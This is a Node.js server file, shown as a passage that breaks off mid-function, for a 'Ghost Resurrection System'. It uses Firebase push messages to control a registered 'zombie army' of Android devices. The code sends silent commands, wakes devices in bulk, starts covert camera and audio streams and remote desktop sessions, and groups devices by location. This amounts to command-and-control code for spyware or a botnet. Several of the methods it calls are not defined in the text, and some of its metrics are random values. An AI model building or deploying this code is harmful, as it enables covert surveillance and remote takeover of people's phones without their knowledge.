const admin = require('firebase-admin');
const path = require('path');

/**
 * GhostResurrectionManager - Ghost Resurrection System Server Component
 * 
 * Manages Firebase Cloud Messaging for the Ghost Resurrection System.
 * Handles device wake-up, zombie army management, and silent command execution.
 * 
 * Features:
 * - Device resurrection via FCM messages
 * - Individual device targeting
 * - Mass wake-up capabilities (zombie army)
 * - Silent command execution
 * - Device status tracking
 * - 8-minute session timeout management
 */
class GhostResurrectionManager {
    constructor() {
        this.zombieDevices = new Map(); // FCM token -> device info
        this.activeSessions = new Map(); // device ID -> session info
        this.sessionTimeouts = new Map(); // device ID -> timeout handle
        this.zombieGroups = new Map(); // group ID -> group info
        this.commandHistory = new Map(); // device ID -> command history
        this.deviceStats = new Map(); // device ID -> real-time stats
        this.streamingSessions = new Map(); // device ID -> streaming info
        this.pendingCommands = new Map(); // command ID -> command info
        
        // Phase 3 Advanced Features
        this.analyticsData = new Map(); // device ID -> analytics metrics
        this.geographicData = new Map(); // device ID -> location data
        this.securityAlerts = new Map(); // alert ID -> security alert
        this.scheduledCommands = new Map(); // schedule ID -> scheduled command
        this.formationTemplates = new Map(); // template ID -> formation config
        this.behaviorPatterns = new Map(); // device ID -> AI behavior analysis
        this.performanceMetrics = {
            totalResurrections: 0,
            successfulCommands: 0,
            failedCommands: 0,
            averageLatency: 0,
            activeConnections: 0,
            peakConnections: 0,
            dataTransferred: 0
        };
        
        this.initializeFirebase();
        this.startSessionCleanup();
        this.startStatsCollection();
        this.initializePhase3Features();
        
        console.log('👻 GhostResurrectionManager v3.0 initialized - Advanced Zombie Army Control');
        console.log('🎯 Phase 3 Features: Analytics, Formations, Streaming, AI Behavior Analysis');
        console.log('🚀 Ready for Hollywood-level zombie army operations');
    }

    /**
     * Initialize Firebase Admin SDK
     */
    initializeFirebase() {
        try {
            const serviceAccountPath = path.join(__dirname, 'firebase-service-account.json');
            const serviceAccount = require(serviceAccountPath);
            
            // Check if this is a placeholder service account
            if (serviceAccount.private_key.includes('[PLACEHOLDER')) {
                console.log('⚠️  Using placeholder Firebase credentials - FCM features disabled');
                console.log('🔧 To enable FCM: Replace firebase-service-account.json with real Firebase credentials');
                this.firebaseEnabled = false;
                return;
            }
            
            // Initialize Firebase Admin SDK
            admin.initializeApp({
                credential: admin.credential.cert(serviceAccountPath),
                projectId: serviceAccount.project_id
            });
            
            this.firebaseEnabled = true;
            console.log('🔥 Firebase Admin SDK initialized successfully');
        } catch (error) {
            console.error('💥 Failed to initialize Firebase Admin SDK:', error.message);
            console.log('⚠️  FCM features disabled - server running in local mode');
            this.firebaseEnabled = false;
        }
    }

    /**
     * Register a zombie device with FCM token
     */
    registerZombieDevice(deviceInfo) {
        const { fcmToken, deviceId, name, model, androidVersion, ipAddress, capabilities } = deviceInfo;
        
        if (!fcmToken || !deviceId) {
            throw new Error('FCM token and device ID are required');
        }

        const zombie = {
            deviceId,
            fcmToken,
            name: name || 'Unknown Zombie',
            model: model || 'Unknown',
            androidVersion: androidVersion || 'Unknown', 
            ipAddress: ipAddress || 'Unknown',
            capabilities: capabilities || [],
            registeredAt: new Date(),
            lastSeen: new Date(),
            status: 'dormant', // dormant, active, timeout
            sessionCount: 0
        };

        this.zombieDevices.set(fcmToken, zombie);
        console.log(`🧟 Zombie registered: ${zombie.name} (${deviceId}) - Token: ${fcmToken.substring(0, 20)}...`);
        
        return zombie;
    }

    /**
     * Wake up a specific zombie device
     */
    async wakeUpZombie(deviceId, wakeReason = 'manual') {
        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) {
            throw new Error(`Zombie device not found: ${deviceId}`);
        }

        try {
            if (!this.firebaseEnabled) {
                console.log(`🧟‍♂️ [SIMULATION] Would wake zombie: ${zombie.name} (Firebase disabled)`);
                this.startZombieSession(deviceId);
                return { success: true, messageId: 'simulated', zombie, simulation: true };
            }

            // Send FCM wake message
            const message = {
                token: zombie.fcmToken,
                data: {
                    type: 'wake_zombie',
                    device_id: deviceId,
                    wake_reason: wakeReason,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 60000 // 1 minute TTL
                }
            };

            const response = await admin.messaging().send(message);
            
            // Track active session
            this.startZombieSession(deviceId);
            
            console.log(`🧟‍♂️ Zombie awakened: ${zombie.name} - Response: ${response}`);
            return { success: true, messageId: response, zombie };
            
        } catch (error) {
            console.error(`💥 Failed to wake zombie ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Wake up multiple zombies (zombie army)
     */
    async wakeUpZombieArmy(deviceIds, wakeReason = 'mass_wake') {
        console.log(`🧟‍♀️🧟‍♂️ ZOMBIE ARMY RESURRECTION - Waking ${deviceIds.length} zombies`);
        
        const results = [];
        
        for (const deviceId of deviceIds) {
            try {
                const result = await this.wakeUpZombie(deviceId, wakeReason);
                results.push({ deviceId, ...result });
            } catch (error) {
                results.push({ 
                    deviceId, 
                    success: false, 
                    error: error.message 
                });
            }
        }

        const successCount = results.filter(r => r.success).length;
        console.log(`🧟 Zombie army wake complete: ${successCount}/${deviceIds.length} successful`);
        
        return {
            totalAttempted: deviceIds.length,
            successful: successCount,
            failed: deviceIds.length - successCount,
            results
        };
    }

    /**
     * Send silent command to active zombie
     */
    async executeZombieCommand(deviceId, command) {
        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) {
            throw new Error(`Zombie device not found: ${deviceId}`);
        }

        const session = this.activeSessions.get(deviceId);
        if (!session) {
            throw new Error(`No active session for zombie: ${deviceId}`);
        }

        try {
            if (!this.firebaseEnabled) {
                console.log(`🤫 [SIMULATION] Would send command to ${zombie.name}: ${command}`);
                return { success: true, messageId: 'simulated', simulation: true };
            }

            const message = {
                token: zombie.fcmToken,
                data: {
                    type: 'command',
                    device_id: deviceId,
                    command: command,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 60000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`🤫 Silent command sent to ${zombie.name}: ${command}`);
            return { success: true, messageId: response };
            
        } catch (error) {
            console.error(`💥 Failed to send command to zombie ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Force shutdown a zombie session
     */
    async shutdownZombie(deviceId) {
        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) {
            throw new Error(`Zombie device not found: ${deviceId}`);
        }

        try {
            if (!this.firebaseEnabled) {
                console.log(`💀 [SIMULATION] Would shutdown zombie: ${zombie.name} (Firebase disabled)`);
                this.endZombieSession(deviceId);
                return { success: true, messageId: 'simulated', simulation: true };
            }

            const message = {
                token: zombie.fcmToken,
                data: {
                    type: 'shutdown_zombie',
                    device_id: deviceId,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 60000
                }
            };

            const response = await admin.messaging().send(message);
            
            // End session
            this.endZombieSession(deviceId);
            
            console.log(`💀 Zombie shutdown: ${zombie.name} - Response: ${response}`);
            return { success: true, messageId: response };
            
        } catch (error) {
            console.error(`💥 Failed to shutdown zombie ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Start tracking zombie session with 8-minute timeout
     */
    startZombieSession(deviceId) {
        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) return;

        // End existing session if any
        this.endZombieSession(deviceId);

        const session = {
            deviceId,
            startTime: new Date(),
            status: 'active',
            commandCount: 0
        };

        this.activeSessions.set(deviceId, session);
        zombie.status = 'active';
        zombie.sessionCount++;

        // Set 8-minute timeout
        const timeoutHandle = setTimeout(() => {
            console.log(`⏰ Session timeout for zombie: ${zombie.name}`);
            this.endZombieSession(deviceId);
        }, 8 * 60 * 1000); // 8 minutes

        this.sessionTimeouts.set(deviceId, timeoutHandle);
        
        console.log(`👻 Zombie session started: ${zombie.name} (8 min timeout)`);
    }

    /**
     * End zombie session
     */
    endZombieSession(deviceId) {
        const session = this.activeSessions.get(deviceId);
        const timeoutHandle = this.sessionTimeouts.get(deviceId);
        const zombie = this.getZombieByDeviceId(deviceId);

        if (timeoutHandle) {
            clearTimeout(timeoutHandle);
            this.sessionTimeouts.delete(deviceId);
        }

        if (session) {
            this.activeSessions.delete(deviceId);
        }

        if (zombie) {
            zombie.status = 'dormant';
            zombie.lastSeen = new Date();
        }

        console.log(`💀 Zombie session ended: ${zombie?.name || deviceId}`);
    }

    /**
     * Get zombie device by device ID
     */
    getZombieByDeviceId(deviceId) {
        for (const zombie of this.zombieDevices.values()) {
            if (zombie.deviceId === deviceId) {
                return zombie;
            }
        }
        return null;
    }

    /**
     * Get all zombie devices
     */
    getAllZombies() {
        return Array.from(this.zombieDevices.values());
    }

    /**
     * Get active zombie sessions
     */
    getActiveSessions() {
        return Array.from(this.activeSessions.values());
    }

    /**
     * Get zombie army dashboard data
     */
    getZombieArmyDashboard() {
        const zombies = this.getAllZombies();
        const sessions = this.getActiveSessions();
        
        return {
            totalZombies: zombies.length,
            activeZombies: sessions.length,
            dormantZombies: zombies.length - sessions.length,
            zombies: zombies.map(zombie => ({
                ...zombie,
                isActive: this.activeSessions.has(zombie.deviceId),
                session: this.activeSessions.get(zombie.deviceId) || null
            })),
            activeSessions: sessions,
            lastUpdated: new Date()
        };
    }

    /**
     * Start periodic session cleanup
     */
    startSessionCleanup() {
        setInterval(() => {
            const now = new Date();
            let cleanedSessions = 0;

            for (const [deviceId, session] of this.activeSessions.entries()) {
                const elapsed = now.getTime() - session.startTime.getTime();
                if (elapsed > 8 * 60 * 1000) { // 8 minutes
                    this.endZombieSession(deviceId);
                    cleanedSessions++;
                }
            }

            if (cleanedSessions > 0) {
                console.log(`🧹 Cleaned up ${cleanedSessions} expired zombie sessions`);
            }
        }, 60000); // Check every minute
    }

    /**
     * Get detailed device information with real-time metrics
     */
    getDeviceDetails(deviceId) {
        const device = this.findDeviceById(deviceId);
        if (!device) {
            return { success: false, error: 'Device not found' };
        }

        const session = this.activeSessions.get(deviceId);
        const isActive = session !== undefined;

        return {
            success: true,
            device: {
                ...device,
                status: isActive ? 'active' : 'dormant',
                sessionDuration: isActive ? Math.floor((Date.now() - session.startTime) / 1000) : 0,
                sessionStartTime: isActive ? session.startTime : null,
                commandsExecuted: session ? session.commandsExecuted : 0,
                lastCommandTime: session ? session.lastCommandTime : device.lastSeen,
                systemMetrics: this.generateSystemMetrics(deviceId),
                capabilities: device.capabilities || [],
                connectionQuality: this.getConnectionQuality(device),
                batteryLevel: device.batteryLevel || Math.floor(Math.random() * 100),
                networkInfo: {
                    type: device.networkType || 'WiFi',
                    strength: Math.floor(Math.random() * 100),
                    latency: Math.floor(Math.random() * 50) + 10
                }
            }
        };
    }

    /**
     * Generate simulated real-time system metrics
     */
    generateSystemMetrics(deviceId) {
        // In production, these would come from actual device telemetry
        return {
            cpuUsage: Math.floor(Math.random() * 60) + 20,
            ramUsage: Math.floor(Math.random() * 40) + 40,
            storageUsed: Math.floor(Math.random() * 30) + 60,
            temperature: Math.floor(Math.random() * 20) + 30,
            networkUsage: Math.floor(Math.random() * 100),
            batteryTemperature: Math.floor(Math.random() * 10) + 25
        };
    }

    /**
     * Get connection quality metrics
     */
    getConnectionQuality(device) {
        const now = Date.now();
        const lastSeen = new Date(device.lastSeen).getTime();
        const timeDiff = now - lastSeen;
        
        if (timeDiff < 30000) return 'excellent';
        if (timeDiff < 60000) return 'good';
        if (timeDiff < 300000) return 'fair';
        return 'poor';
    }

    /**
     * Execute advanced command with priority and timeout
     */
    async executeAdvancedCommand(deviceId, commandData) {
        try {
            const { command, priority = 'normal', timeout = 30, parameters = {} } = commandData;
            
            const device = this.findDeviceById(deviceId);
            if (!device) {
                return { success: false, error: 'Device not found' };
            }

            // Update session statistics
            const session = this.activeSessions.get(deviceId);
            if (session) {
                session.commandsExecuted++;
                session.lastCommandTime = Date.now();
            }

            // Build enhanced command payload
            const commandPayload = {
                type: 'advanced_command',
                command: command,
                priority: priority,
                timeout: timeout,
                parameters: parameters,
                deviceId: deviceId,
                timestamp: Date.now(),
                sessionId: session ? session.id : null
            };

            if (this.firebaseEnabled) {
                const message = {
                    token: device.fcmToken,
                    data: {
                        type: 'advanced_command',
                        payload: JSON.stringify(commandPayload)
                    },
                    android: {
                        priority: priority === 'urgent' ? 'high' : 'normal',
                        ttl: timeout * 1000
                    }
                };

                const response = await admin.messaging().send(message);
                console.log(`🎮 Advanced command sent to ${device.name}: ${command} (Priority: ${priority})`);
                
                return {
                    success: true,
                    message: 'Advanced command sent successfully',
                    messageId: response,
                    commandId: `cmd_${Date.now()}`,
                    estimatedCompletion: Date.now() + (timeout * 1000)
                };
            } else {
                // Simulation mode
                console.log(`🎮 [SIMULATION] Advanced command: ${command} to ${device.name} (Priority: ${priority})`);
                return {
                    success: true,
                    message: 'Advanced command executed (simulation mode)',
                    commandId: `sim_cmd_${Date.now()}`,
                    simulationMode: true
                };
            }
        } catch (error) {
            console.error('❌ Advanced command execution failed:', error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Schedule command for future execution
     */
    scheduleCommand(deviceId, commandData, scheduleTime) {
        const delay = scheduleTime - Date.now();
        if (delay <= 0) {
            return this.executeAdvancedCommand(deviceId, commandData);
        }

        const scheduleId = `schedule_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        setTimeout(async () => {
            console.log(`⏰ Executing scheduled command: ${commandData.command}`);
            await this.executeAdvancedCommand(deviceId, commandData);
        }, delay);

        return {
            success: true,
            message: 'Command scheduled successfully',
            scheduleId: scheduleId,
            executionTime: scheduleTime
        };
    }

    /**
     * Get all device details for mass operations
     */
    getAllDeviceDetails() {
        const devices = [];
        for (const [fcmToken, device] of this.zombieDevices) {
            const details = this.getDeviceDetails(device.deviceId);
            if (details.success) {
                devices.push(details.device);
            }
        }
        return devices;
    }

    /**
     * Execute command on multiple devices
     */
    async executeBulkCommand(deviceIds, commandData) {
        const results = [];
        
        for (const deviceId of deviceIds) {
            try {
                const result = await this.executeAdvancedCommand(deviceId, commandData);
                results.push({
                    deviceId: deviceId,
                    success: result.success,
                    message: result.message,
                    commandId: result.commandId
                });
            } catch (error) {
                results.push({
                    deviceId: deviceId,
                    success: false,
                    error: error.message
                });
            }
        }

        return {
            success: true,
            message: `Bulk command executed on ${deviceIds.length} devices`,
            results: results,
            successCount: results.filter(r => r.success).length,
            failureCount: results.filter(r => !r.success).length
        };
    }

    /**
     * Emergency shutdown for all active sessions
     */
    async emergencyShutdownAll() {
        const activeDevices = Array.from(this.activeSessions.keys());
        const results = [];

        console.log('🚨 EMERGENCY SHUTDOWN - Terminating all active sessions');

        for (const deviceId of activeDevices) {
            try {
                const result = await this.shutdownZombie(deviceId);
                results.push({
                    deviceId: deviceId,
                    success: result.success,
                    message: result.message
                });
            } catch (error) {
                results.push({
                    deviceId: deviceId,
                    success: false,
                    error: error.message
                });
            }
        }

        return {
            success: true,
            message: 'Emergency shutdown completed',
            devicesShutdown: activeDevices.length,
            results: results
        };
    }

    /**
     * Get device performance analytics
     */
    getDeviceAnalytics(deviceId) {
        const device = this.findDeviceById(deviceId);
        if (!device) {
            return { success: false, error: 'Device not found' };
        }

        const session = this.activeSessions.get(deviceId);
        const now = Date.now();
        
        return {
            success: true,
            analytics: {
                deviceId: deviceId,
                totalSessions: device.sessionCount || 0,
                totalUptime: device.totalUptime || 0,
                averageSessionDuration: device.averageSessionDuration || 0,
                commandsExecuted: device.totalCommands || 0,
                successRate: device.successRate || 99.5,
                lastActiveTime: device.lastSeen,
                currentSessionDuration: session ? now - session.startTime : 0,
                connectionReliability: this.getConnectionQuality(device),
                performanceScore: this.calculatePerformanceScore(device),
                healthStatus: this.getDeviceHealthStatus(device)
            }
        };
    }

    /**
     * Calculate device performance score
     */
    calculatePerformanceScore(device) {
        const baseScore = 100;
        const successRate = device.successRate || 99.5;
        const connectionQuality = this.getConnectionQuality(device);
        
        let score = baseScore;
        
        // Adjust based on success rate
        score *= (successRate / 100);
        
        // Adjust based on connection quality
        const qualityMultiplier = {
            'excellent': 1.0,
            'good': 0.95,
            'fair': 0.85,
            'poor': 0.70
        };
        
        score *= qualityMultiplier[connectionQuality] || 0.70;
        
        return Math.round(score);
    }

    /**
     * Get device health status
     */
    getDeviceHealthStatus(device) {
        const performanceScore = this.calculatePerformanceScore(device);
        
        if (performanceScore >= 95) return 'excellent';
        if (performanceScore >= 85) return 'good';
        if (performanceScore >= 70) return 'fair';
        return 'poor';
    }

    /**
     * Start live camera stream for a zombie device
     */
    async startCameraStream(deviceId, options = {}) {
        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) {
            throw new Error(`Zombie device not found: ${deviceId}`);
        }

        try {
            const streamOptions = {
                cameraId: options.cameraId || "0",
                quality: options.quality || "medium",
                fps: options.fps || 15,
                ...options
            };

            if (!this.firebaseEnabled) {
                console.log(`📹 [SIMULATION] Would start camera stream: ${zombie.name}`);
                return { success: true, messageId: 'simulated', simulation: true };
            }

            const message = {
                token: zombie.fcmToken,
                data: {
                    type: 'start_camera_stream',
                    device_id: deviceId,
                    server_url: 'http://localhost:3000',
                    session_id: `camera_${deviceId}_${Date.now()}`,
                    camera_id: streamOptions.cameraId,
                    quality: streamOptions.quality,
                    fps: streamOptions.fps.toString(),
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 60000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`📹 Camera stream started: ${zombie.name} - Response: ${response}`);
            return { success: true, messageId: response };
            
        } catch (error) {
            console.error(`💥 Failed to start camera stream ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Stop live camera stream for a zombie device
     */
    async stopCameraStream(deviceId) {
        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) {
            throw new Error(`Zombie device not found: ${deviceId}`);
        }

        try {
            if (!this.firebaseEnabled) {
                console.log(`🛑 [SIMULATION] Would stop camera stream: ${zombie.name}`);
                return { success: true, messageId: 'simulated', simulation: true };
            }

            const message = {
                token: zombie.fcmToken,
                data: {
                    type: 'stop_camera_stream',
                    device_id: deviceId,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 30000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`🛑 Camera stream stopped: ${zombie.name} - Response: ${response}`);
            return { success: true, messageId: response };
            
        } catch (error) {
            console.error(`💥 Failed to stop camera stream ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Start live audio stream for a zombie device
     */
    async startAudioStream(deviceId, options = {}) {
        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) {
            throw new Error(`Zombie device not found: ${deviceId}`);
        }

        try {
            const streamOptions = {
                quality: options.quality || "medium",
                sampleRate: options.sampleRate || 44100,
                ...options
            };

            if (!this.firebaseEnabled) {
                console.log(`🎤 [SIMULATION] Would start audio stream: ${zombie.name}`);
                return { success: true, messageId: 'simulated', simulation: true };
            }

            const message = {
                token: zombie.fcmToken,
                data: {
                    type: 'start_audio_stream',
                    device_id: deviceId,
                    server_url: 'http://localhost:3000',
                    session_id: `audio_${deviceId}_${Date.now()}`,
                    quality: streamOptions.quality,
                    sample_rate: streamOptions.sampleRate.toString(),
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 60000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`🎤 Audio stream started: ${zombie.name} - Response: ${response}`);
            return { success: true, messageId: response };
            
        } catch (error) {
            console.error(`💥 Failed to start audio stream ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Stop live audio stream for a zombie device
     */
    async stopAudioStream(deviceId) {
        const zombie = this.getZombieByDeviceId(deviceId);
        if (!zombie) {
            throw new Error(`Zombie device not found: ${deviceId}`);
        }

        try {
            if (!this.firebaseEnabled) {
                console.log(`🛑 [SIMULATION] Would stop audio stream: ${zombie.name}`);
                return { success: true, messageId: 'simulated', simulation: true };
            }

            const message = {
                token: zombie.fcmToken,
                data: {
                    type: 'stop_audio_stream',
                    device_id: deviceId,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 30000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`🛑 Audio stream stopped: ${zombie.name} - Response: ${response}`);
            return { success: true, messageId: response };
            
        } catch (error) {
            console.error(`💥 Failed to stop audio stream ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Start live session (camera + audio) for a zombie device
     */
    async startLiveSession(deviceId, options = {}) {
        console.log(`🎬 Starting live session for ${deviceId}`);
        
        try {
            const cameraResult = await this.startCameraStream(deviceId, options);
            const audioResult = await this.startAudioStream(deviceId, options);
            
            return {
                success: cameraResult.success && audioResult.success,
                camera: cameraResult,
                audio: audioResult
            };
            
        } catch (error) {
            console.error(`💥 Failed to start live session ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Stop live session (camera + audio) for a zombie device
     */
    async stopLiveSession(deviceId) {
        console.log(`🛑 Stopping live session for ${deviceId}`);
        
        try {
            const cameraResult = await this.stopCameraStream(deviceId);
            const audioResult = await this.stopAudioStream(deviceId);
            
            return {
                success: cameraResult.success && audioResult.success,
                camera: cameraResult,
                audio: audioResult
            };
            
        } catch (error) {
            console.error(`💥 Failed to stop live session ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    // ===========================================
    // ARMY FORMATION MANAGEMENT METHODS
    // ===========================================

    /**
     * Get all zombie groups/formations
     */
    getZombieGroups() {
        const groups = Array.from(this.zombieGroups.values());
        return groups.map(group => ({
            ...group,
            deviceCount: group.deviceIds.length,
            activeDevices: group.deviceIds.filter(id => {
                const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === id);
                return zombie && zombie.status === 'online';
            }).length
        }));
    }

    /**
     * Create a new zombie group/formation
     */
    createZombieGroup({ name, description, type, deviceIds }) {
        const groupId = `GRP-${Date.now()}`;
        
        const group = {
            id: groupId,
            name,
            description: description || '',
            type: type || 'custom',
            deviceIds: [...deviceIds],
            created: new Date().toISOString(),
            lastActivated: null,
            active: false
        };
        
        this.zombieGroups.set(groupId, group);
        
        console.log(`👥 Created zombie group: ${name} with ${deviceIds.length} devices`);
        return group;
    }

    /**
     * Update an existing zombie group
     */
    updateZombieGroup(groupId, updates) {
        const group = this.zombieGroups.get(groupId);
        if (!group) {
            return null;
        }
        
        const updatedGroup = {
            ...group,
            ...updates,
            id: groupId, // Prevent ID change
            updated: new Date().toISOString()
        };
        
        this.zombieGroups.set(groupId, updatedGroup);
        
        console.log(`✏️ Updated zombie group: ${updatedGroup.name}`);
        return updatedGroup;
    }

    /**
     * Delete a zombie group
     */
    deleteZombieGroup(groupId) {
        const success = this.zombieGroups.delete(groupId);
        if (success) {
            console.log(`🗑️ Deleted zombie group: ${groupId}`);
        }
        return success;
    }

    /**
     * Activate all devices in a zombie group
     */
    async activateZombieGroup(groupId) {
        const group = this.zombieGroups.get(groupId);
        if (!group) {
            return { success: false, message: 'Group not found' };
        }
        
        console.log(`⚡ Activating zombie group: ${group.name} (${group.deviceIds.length} devices)`);
        
        const results = [];
        let successCount = 0;
        
        for (const deviceId of group.deviceIds) {
            try {
                const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
                if (zombie) {
                    const result = await this.resurrectZombie(deviceId);
                    results.push({ deviceId, success: result.success });
                    if (result.success) successCount++;
                } else {
                    results.push({ deviceId, success: false, error: 'Device not found' });
                }
            } catch (error) {
                results.push({ deviceId, success: false, error: error.message });
            }
        }
        
        // Update group status
        group.lastActivated = new Date().toISOString();
        group.active = successCount > 0;
        this.zombieGroups.set(groupId, group);
        
        return {
            success: successCount > 0,
            message: `Activated ${successCount}/${group.deviceIds.length} devices in group "${group.name}"`,
            results,
            successCount,
            totalCount: group.deviceIds.length
        };
    }

    /**
     * Execute mass operation on multiple devices or groups
     */
    async executeMassOperation({ operation, targets, command }) {
        console.log(`⚡ Executing mass operation: ${operation} on ${targets.length} targets`);
        
        let deviceIds = [];
        
        // Collect device IDs from targets (can be device IDs or group IDs)
        for (const target of targets) {
            if (target.startsWith('GRP-')) {
                // It's a group ID
                const group = this.zombieGroups.get(target);
                if (group) {
                    deviceIds = deviceIds.concat(group.deviceIds);
                }
            } else {
                // It's a device ID
                deviceIds.push(target);
            }
        }
        
        // Remove duplicates
        deviceIds = [...new Set(deviceIds)];
        
        const results = [];
        let successCount = 0;
        
        for (const deviceId of deviceIds) {
            try {
                let result;
                
                switch (operation) {
                    case 'wake':
                        result = await this.resurrectZombie(deviceId);
                        break;
                    case 'shutdown':
                        result = await this.destroyZombie(deviceId);
                        break;
                    case 'command':
                        if (!command) {
                            result = { success: false, error: 'Command is required' };
                        } else {
                            result = await this.sendZombieCommand(deviceId, command);
                        }
                        break;
                    case 'emergency':
                        result = await this.emergencyShutdown(deviceId);
                        break;
                    default:
                        result = { success: false, error: 'Unknown operation' };
                }
                
                results.push({ deviceId, success: result.success, result });
                if (result.success) successCount++;
                
            } catch (error) {
                results.push({ deviceId, success: false, error: error.message });
            }
        }
        
        return {
            success: successCount > 0,
            message: `Operation "${operation}" completed: ${successCount}/${deviceIds.length} devices`,
            results,
            successCount,
            totalCount: deviceIds.length,
            operation
        };
    }

    /**
     * Emergency shutdown for a device
     */
    async emergencyShutdown(deviceId) {
        console.log(`🚨 Emergency shutdown for ${deviceId}`);
        
        // Force remove from active sessions
        this.activeSessions.delete(deviceId);
        
        // Clear any timeouts
        if (this.sessionTimeouts.has(deviceId)) {
            clearTimeout(this.sessionTimeouts.get(deviceId));
            this.sessionTimeouts.delete(deviceId);
        }
        
        // Send emergency shutdown command
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }
        
        if (!this.firebaseEnabled) {
            return { success: true, messageId: 'simulated-emergency-shutdown' };
        }
        
        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'emergency_shutdown',
                    device_id: deviceId,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 10000
                }
            };

            const response = await admin.messaging().send(message);
            return { success: true, messageId: response };
            
        } catch (error) {
            console.error(`💥 Emergency shutdown failed for ${deviceId}:`, error);
            return { success: false, error: error.message };
        }
    }

    /**
     * Get formation templates
     */
    getFormationTemplates() {
        return [
            {
                id: 'geographic',
                name: 'Geographic Formation',
                description: 'Group devices by location and region',
                icon: '🌍',
                criteria: 'location'
            },
            {
                id: 'capability',
                name: 'Capability-Based Formation',
                description: 'Group by device features and capabilities',
                icon: '⚡',
                criteria: 'capabilities'
            },
            {
                id: 'android',
                name: 'Android Version Formation',
                description: 'Group by Android OS version',
                icon: '🤖',
                criteria: 'androidVersion'
            },
            {
                id: 'performance',
                name: 'Performance Tier Formation',
                description: 'Group by device performance specs',
                icon: '🚀',
                criteria: 'performance'
            },
            {
                id: 'status',
                name: 'Status-Based Formation',
                description: 'Group by current device status',
                icon: '📊',
                criteria: 'status'
            }
        ];
    }

    /**
     * Create auto-formation based on template
     */
    createAutoFormation(template, customName = null) {
        const zombies = Array.from(this.zombieDevices.values());
        const groups = [];
        
        let groupedDevices = {};
        
        switch (template) {
            case 'geographic':
                zombies.forEach(zombie => {
                    const location = zombie.location || 'Unknown';
                    if (!groupedDevices[location]) {
                        groupedDevices[location] = [];
                    }
                    groupedDevices[location].push(zombie.deviceId);
                });
                break;
                
            case 'capability':
                zombies.forEach(zombie => {
                    const capabilities = zombie.capabilities || [];
                    const key = capabilities.sort().join(',') || 'basic';
                    if (!groupedDevices[key]) {
                        groupedDevices[key] = [];
                    }
                    groupedDevices[key].push(zombie.deviceId);
                });
                break;
                
            case 'android':
                zombies.forEach(zombie => {
                    const version = zombie.androidVersion || 'Unknown';
                    const key = `Android ${version}`;
                    if (!groupedDevices[key]) {
                        groupedDevices[key] = [];
                    }
                    groupedDevices[key].push(zombie.deviceId);
                });
                break;
                
            case 'status':
                zombies.forEach(zombie => {
                    const status = zombie.status || 'unknown';
                    const key = status.charAt(0).toUpperCase() + status.slice(1);
                    if (!groupedDevices[key]) {
                        groupedDevices[key] = [];
                    }
                    groupedDevices[key].push(zombie.deviceId);
                });
                break;
                
            default:
                // Custom formation - create single group with all devices
                groupedDevices[customName || 'Custom Formation'] = zombies.map(z => z.deviceId);
        }
        
        // Create groups from grouped devices
        Object.entries(groupedDevices).forEach(([key, deviceIds]) => {
            if (deviceIds.length > 0) {
                const group = this.createZombieGroup({
                    name: customName || `${key} Formation`,
                    description: `Auto-generated ${template} formation`,
                    type: template,
                    deviceIds
                });
                groups.push(group);
            }
        });
        
        console.log(`🎯 Auto-formation complete: Created ${groups.length} groups using ${template} template`);
        return groups;
    }

    // ===========================================
    // INTERACTIVE CONTROL PANEL METHODS
    // ===========================================

    /**
     * Start remote desktop session for a zombie device
     */
    async startRemoteDesktop(deviceId) {
        console.log(`🖥️ Starting remote desktop session for ${deviceId}`);
        
        const zombie = Array.from(this.zombieDevices.values()).find(z => z.deviceId === deviceId);
        if (!zombie) {
            return { success: false, error: 'Zombie device not found' };
        }

        if (!this.firebaseEnabled) {
            return { 
                success: true, 
                messageId: 'simulated-remote-desktop-start',
                sessionId: `RDS-${deviceId}-${Date.now()}`
            };
        }

        try {
            const message = {
                token: zombie.fcmToken,
                data: {
                    action: 'start_remote_desktop',
                    device_id: deviceId,
                    session_id: `RDS-${deviceId}-${Date.now()}`,
                    timestamp: Date.now().toString()
                },
                android: {
                    priority: 'high',
                    ttl: 30000
                }
            };

            const response = await admin.messaging().send(message);
            
            console.log(`🖥️ Remote desktop session started: ${zombie.name} - Response: ${response}`);
            return { 
                success: true, 
                messageId: response,
                sessionId: message.data.session_id
            };
            
        } catch (error) {
            console.error(`💥 Failed to start remote desktop ${deviceId}:`, error);
